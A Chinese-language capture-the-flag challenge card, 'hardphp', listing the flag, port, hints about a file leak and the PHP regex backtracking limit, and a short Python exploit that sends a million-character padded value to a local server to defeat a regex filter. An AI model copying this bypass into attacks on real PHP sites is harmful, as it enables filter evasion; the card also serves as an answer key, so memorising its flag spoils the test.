# 题目：hardphp

### 题目描述：试试大声说出：v我50！

### KEY: flag{haHa_tHiS_Is_V_mE50_F1@G}

### 配置信息：

1. 开放端口： `18080`

### 提示

1.文件泄露

2.正则表达式回溯上限

### exp

```python
import requests
data = {
    'a': 'vme50'+'a'*1000000+'!'
}
res = requests.post('http://localhost:18080/flagflagflaghhh.php',
                    data=data, allow_redirects=False)
print(res.text)
```

